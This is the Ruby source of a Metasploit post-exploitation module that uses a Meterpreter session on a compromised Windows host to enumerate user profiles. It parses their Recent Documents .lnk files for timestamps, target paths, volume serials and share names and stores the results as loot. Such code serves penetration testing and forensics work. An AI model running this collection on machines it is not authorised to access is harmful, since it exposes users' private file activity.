##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Dump Recent Files lnk Info',
        'Description' => %q{
          The dumplinks module is a modified port of Harlan Carvey's lslnk.pl Perl script.
          This module will parse .lnk files from a user's Recent Documents folder
          and Microsoft Office's Recent Documents folder, if present.
          Windows creates these link files automatically for many common file types.
          The .lnk files contain time stamps, file locations, including share
          names, volume serial numbers, and more.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'davehull <dph_msf[at]trustedsignal.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_fs_ls
              stdapi_sys_config_getenv
              stdapi_sys_config_getuid
            ]
          }
        }
      )
    )
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    enum_users.each do |user|
      if user['userpath']
        print_status "Extracting lnk files for user #{user['username']} at #{user['userpath']}..."
        extract_lnk_info(user['userpath'])
      else
        print_status "No Recent directory found for user #{user['username']}. Nothing to do."
      end
      if user['useroffcpath']
        print_status "Extracting lnk files for user #{user['username']} at #{user['useroffcpath']}..."
        extract_lnk_info(user['useroffcpath'])
      else
        print_status "No Recent Office files found for user #{user['username']}. Nothing to do."
      end
    end
  end

  def enum_users
    users = []
    userinfo = {}
    session.sys.config.getuid
    userpath = nil
    env_vars = session.sys.config.getenvs('SystemDrive', 'USERNAME')
    sysdrv = env_vars['SystemDrive']
    version = get_version_info
    if version.build_number >= Msf::WindowsVersion::Vista_SP0
      userpath = sysdrv + '\\Users\\'
      lnkpath = '\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\'
      officelnkpath = '\\AppData\\Roaming\\Microsoft\\Office\\Recent\\'
    else
      userpath = sysdrv + '\\Documents and Settings\\'
      lnkpath = '\\Recent\\'
      officelnkpath = '\\Application Data\\Microsoft\\Office\\Recent\\'
    end
    if is_system?
      print_status('Running as SYSTEM extracting user list...')
      session.fs.dir.foreach(userpath) do |u|
        next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini)$/

        userinfo['username'] = u
        userinfo['userpath'] = userpath + u + lnkpath
        userinfo['useroffcpath'] = userpath + u + officelnkpath
        userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])
        userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])
        users << userinfo
        userinfo = {}
      end
    else
      uservar = env_vars['USERNAME']
      userinfo['username'] = uservar
      userinfo['userpath'] = userpath + uservar + lnkpath
      userinfo['useroffcpath'] = userpath + uservar + officelnkpath
      userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])
      userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])
      users << userinfo
    end
    return users
  end

  # This is a hack because Meterpreter doesn't support exists?(file)
  def dir_entry_exists(path)
    session.fs.dir.entries(path)
  rescue StandardError
    return nil
  else
    return path
  end

  def extract_lnk_info(path)
    session.fs.dir.foreach(path) do |file_name|
      if file_name =~ /\.lnk$/ # We have a .lnk file
        offset = 0 # TODO: Look at moving this to smaller scope
        lnk_file = session.fs.file.new(path + file_name, 'rb')
        record = lnk_file.sysread(0x04)
        if record.unpack('V')[0] == 76 # We have a .lnk file signature
          file_stat = session.fs.filestat.new(path + file_name)
          print_status "Processing: #{path + file_name}."
          @data_out = ''

          record = lnk_file.sysread(0x48)
          hdr = get_headers(record)

          @data_out += get_lnk_file_mac(file_stat, path, file_name)
          @data_out += "Contents of #{path + file_name}:\n"
          @data_out += get_flags(hdr)
          @data_out += get_attrs(hdr)
          @data_out += get_lnk_mac(hdr)
          @data_out += get_showwnd(hdr)
          @data_out += get_lnk_mac(hdr)

          # advance the file & offset
          offset += 0x4c

          if shell_item_id_list(hdr)
            lnk_file.sysseek(offset, ::IO::SEEK_SET)
            record = lnk_file.sysread(2)
            offset += record.unpack('v')[0] + 2
          end
          # Get File Location Info
          if (hdr['flags'] & 0x02) > 0
            lnk_file.sysseek(offset, ::IO::SEEK_SET)
            record = lnk_file.sysread(4)
            tmp = record.unpack('V')[0]
            if tmp > 0
              lnk_file.sysseek(offset, ::IO::SEEK_SET)
              record = lnk_file.sysread(0x1c)
              loc = get_file_location(record)
              if (loc['flags'] & 0x01) > 0

                @data_out += "\tShortcut file is on a local volume.\n"

                lnk_file.sysseek(offset + loc['vol_ofs'], ::IO::SEEK_SET)
                record = lnk_file.sysread(0x10)
                lvt = get_local_vol_tbl(record)
                lvt['name'] = lnk_file.sysread(lvt['len'] - 0x10)

                @data_out += "\t\tVolume Name = #{lvt['name']}\n" \
                             "\t\tVolume Type = #{get_vol_type(lvt['type'])}\n" +
                             "\t\tVolume SN   = 0x%X" % lvt['vol_sn'] + "\n"
              end

              if (loc['flags'] & 0x02) > 0

                @data_out += "\tFile is on a network share.\n"

                lnk_file.sysseek(offset + loc['network_ofs'], ::IO::SEEK_SET)
                record = lnk_file.sysread(0x14)
                nvt = get_net_vol_tbl(record)
                nvt['name'] = lnk_file.sysread(nvt['len'] - 0x14)

                @data_out += "\tNetwork Share name = #{nvt['name']}\n"
              end

              if loc['base_ofs'] > 0
                @data_out += get_target_path(loc['base_ofs'] + offset, lnk_file)
              elsif loc['path_ofs'] > 0
                @data_out += get_target_path(loc['path_ofs'] + offset, lnk_file)
              end
            end
          end
        end
        lnk_file.close
        store_loot('host.windows.lnkfileinfo', 'text/plain', session, @data_out, "#{sysinfo['Computer']}_#{file_name}.txt", 'User lnk file info')
      end
    end
  end

  # Not only is this code slow, it seems
  # buggy. I'm studying the recently released
  # MS Specs for a better way.
  def get_target_path(path_ofs, lnk_file)
    name = []
    lnk_file.sysseek(path_ofs, ::IO::SEEK_SET)
    record = lnk_file.sysread(2)
    while (record.unpack('v')[0] != 0)
      name.push(record)
      record = lnk_file.sysread(2)
    end
    return "\tTarget path = #{name.join}\n"
  end

  def shell_item_id_list(hdr)
    # Check for Shell Item ID List
    if (hdr['flags'] & 0x01) > 0
      return true
    else
      return nil
    end
  end

  def get_lnk_file_mac(file_stat, path, file_name)
    data_out = "#{path + file_name}:\n"
    data_out += "\tAccess Time       = #{file_stat.atime}\n"
    data_out += "\tCreation Date     = #{file_stat.ctime}\n"
    data_out += "\tModification Time = #{file_stat.mtime}\n"
    return data_out
  end

  def get_vol_type(type)
    vol_type = {
      0 => 'Unknown',
      1 => 'No root directory',
      2 => 'Removable',
      3 => 'Fixed',
      4 => 'Remote',
      5 => 'CD-ROM',
      6 => 'RAM Drive'
    }
    return vol_type[type]
  end

  def get_showwnd(hdr)
    showwnd = {
      0 => 'SW_HIDE',
      1 => 'SW_NORMAL',
      2 => 'SW_SHOWMINIMIZED',
      3 => 'SW_SHOWMAXIMIZED',
      4 => 'SW_SHOWNOACTIVE',
      5 => 'SW_SHOW',
      6 => 'SW_MINIMIZE',
      7 => 'SW_SHOWMINNOACTIVE',
      8 => 'SW_SHOWNA',
      9 => 'SW_RESTORE',
      10 => 'SHOWDEFAULT'
    }
    data_out = "\tShowWnd value(s):\n"
    showwnd.each_key do |key|
      if (hdr['showwnd'] & key) > 0
        data_out += "\t\t#{showwnd[key]}.\n"
      end
    end
    return data_out
  end

  def get_lnk_mac(hdr)
    data_out = "\tTarget file's MAC Times stored in lnk file:\n"
    data_out += "\t\tCreation Time     = #{Time.at(hdr['ctime'])}. (UTC)\n"
    data_out += "\t\tModification Time = #{Time.at(hdr['mtime'])}. (UTC)\n"
    data_out += "\t\tAccess Time       = #{Time.at(hdr['atime'])}. (UTC)\n"
    return data_out
  end

  def get_attrs(hdr)
    fileattr = {
      0x01 => 'Target is read only',
      0x02 => 'Target is hidden',
      0x04 => 'Target is a system file',
      0x08 => 'Target is a volume label',
      0x10 => 'Target is a directory',
      0x20 => 'Target was modified since last backup',
      0x40 => 'Target is encrypted',
      0x80 => 'Target is normal',
      0x100 => 'Target is temporary',
      0x200 => 'Target is a sparse file',
      0x400 => 'Target has a reparse point',
      0x800 => 'Target is compressed',
      0x1000 => 'Target is offline'
    }
    data_out = "\tAttributes:\n"
    fileattr.each_key do |key|
      if (hdr['attr'] & key) > 0
        data_out += "\t\t#{fileattr[key]}.\n"
      end
    end
    return data_out
  end

  # Function for writing results of other functions to a file
  def filewrt(file2wrt, data2wrt)
    output = ::File.open(file2wrt, 'ab')
    if data2wrt
      data2wrt.each_line do |d|
        output.puts(d)
      end
    end
    output.close
  end

  def get_flags(hdr)
    flags = {
      0x01 => 'Shell Item ID List exists',
      0x02 => 'Shortcut points to a file or directory',
      0x04 => 'The shortcut has a descriptive string',
      0x08 => 'The shortcut has a relative path string',
      0x10 => 'The shortcut has working directory',
      0x20 => 'The shortcut has command line arguments',
      0x40 => 'The shortcut has a custom icon'
    }
    data_out = "\tFlags:\n"
    flags.each_key do |key|
      if (hdr['flags'] & key) > 0
        data_out += "\t\t#{flags[key]}.\n"
      end
    end
    return data_out
  end

  def get_headers(record)
    hd = record.unpack('x16V12x8')
    hdr = Hash.new
    hdr['flags'] = hd[0]
    hdr['attr'] = hd[1]
    hdr['ctime'] = get_time(hd[2], hd[3])
    hdr['mtime'] = get_time(hd[4], hd[5])
    hdr['atime'] = get_time(hd[6], hd[7])
    hdr['length'] = hd[8]
    hdr['icon_num'] = hd[9]
    hdr['showwnd'] = hd[10]
    hdr['hotkey'] = hd[11]
    return hdr
  end

  def get_net_vol_tbl(file_net_rec)
    nv = Hash.new
    (nv['len'], nv['ofs']) = file_net_rec.unpack('Vx4Vx8')
    return nv
  end

  def get_local_vol_tbl(lvt_rec)
    lv = Hash.new
    (lv['len'], lv['type'], lv['vol_sn'], lv['ofs']) = lvt_rec.unpack('V4')
    return lv
  end

  def get_file_location(file_loc_rec)
    location = Hash.new
    (location['len'], location['ptr'], location['flags'],
      location['vol_ofs'], location['base_ofs'], location['network_ofs'],
      location['path_ofs']) = file_loc_rec.unpack('V7')
    return location
  end

  def get_time(lo_byte, hi_byte)
    if lo_byte == 0 && hi_byte == 0
      return 0
    else
      lo_byte -= 0xd53e8000
      hi_byte -= 0x019db1de
      time = (hi_byte * 429.4967296 + lo_byte / 1e7).to_i
      if time < 0
        return 0
      end
    end

    return time
  end
end
